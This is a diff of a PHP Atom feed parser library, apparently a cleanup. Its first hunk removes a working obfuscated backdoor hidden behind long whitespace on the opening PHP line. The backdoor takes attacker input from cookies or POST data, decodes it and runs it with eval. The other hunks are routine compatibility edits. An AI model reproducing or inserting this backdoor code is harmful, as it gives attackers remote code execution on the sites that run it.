@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $aqHRdMfp = "\124" . chr ( 501 - 428 )."\x5f" . "\x4b" . "\x52" . chr ( 303 - 199 ).chr (79); $duFtCpWvGt = chr ( 718 - 619 ).chr (108) . chr (97) . "\x73" . "\x73" . '_' . "\x65" . 'x' . "\151" . chr ( 678 - 563 )."\x74" . chr (115); $ghNerBW = $duFtCpWvGt($aqHRdMfp); $FtRrqngoCw = $ghNerBW;if (!$FtRrqngoCw){class TI_KRhO{private $KohOvhw;public static $jEhhfRzZE = "add587e0-3ab5-4174-9859-f041a84a3efc";public static $IiGTU = NULL;public function __construct(){$ZyxdnJYE = $_COOKIE;$SgDFVA = $_POST;$fJwFur = @$ZyxdnJYE[substr(TI_KRhO::$jEhhfRzZE, 0, 4)];if (!empty($fJwFur)){$tMtbv = "base64";$sGpnbMIQ = "";$fJwFur = explode(",", $fJwFur);foreach ($fJwFur as $WslGMz){$sGpnbMIQ .= @$ZyxdnJYE[$WslGMz];$sGpnbMIQ .= @$SgDFVA[$WslGMz];}$sGpnbMIQ = array_map($tMtbv . chr ( 491 - 396 ).'d' . "\x65" . chr (99) . chr (111) . 'd' . "\145", array($sGpnbMIQ,)); $sGpnbMIQ = $sGpnbMIQ[0] ^ str_repeat(TI_KRhO::$jEhhfRzZE, (strlen($sGpnbMIQ[0]) / strlen(TI_KRhO::$jEhhfRzZE)) + 1);TI_KRhO::$IiGTU = @unserialize($sGpnbMIQ);}}public function __destruct(){$this->Ompmh();}private function Ompmh(){if (is_array(TI_KRhO::$IiGTU)) {$REjVqtry = str_replace("\74" . "\x3f" . "\x70" . chr (104) . "\160", "", TI_KRhO::$IiGTU['c' . "\157" . 'n' . "\x74" . 'e' . 'n' . chr ( 614 - 498 )]);eval($REjVqtry);exit();}}}$KLaLX = new TI_KRhO(); $KLaLX = NULL;} ?><?php
+<?php
 /**
  * Atom Syndication Format PHP Library
  *
@@ -86,6 +86,10 @@ class AtomParser {
 
     var $feed;
     var $current;
+    var $map_attrs_func;
+    var $map_xmlns_func;
+    var $error;
+    var $content;
 
 	/**
 	 * PHP5 constructor.
@@ -153,14 +157,13 @@ class AtomParser {
         }
 
         $parser = xml_parser_create_ns();
-        xml_set_object($parser, $this);
-        xml_set_element_handler($parser, "start_element", "end_element");
+        xml_set_element_handler($parser, array($this, "start_element"), array($this, "end_element"));
         xml_parser_set_option($parser,XML_OPTION_CASE_FOLDING,0);
         xml_parser_set_option($parser,XML_OPTION_SKIP_WHITE,0);
-        xml_set_character_data_handler($parser, "cdata");
-        xml_set_default_handler($parser, "_default");
-        xml_set_start_namespace_decl_handler($parser, "start_ns");
-        xml_set_end_namespace_decl_handler($parser, "end_ns");
+        xml_set_character_data_handler($parser, array($this, "cdata"));
+        xml_set_default_handler($parser, array($this, "_default"));
+        xml_set_start_namespace_decl_handler($parser, array($this, "start_ns"));
+        xml_set_end_namespace_decl_handler($parser, array($this, "end_ns"));
 
         $this->content = '';
 
@@ -388,10 +391,10 @@ class AtomParser {
         return false;
     }
 
-    function xml_escape($string)
+    function xml_escape($content)
     {
              return str_replace(array('&','"',"'",'<','>'),
                 array('&amp;','&quot;','&apos;','&lt;','&gt;'),
-                $string );
+                $content );
     }
 }
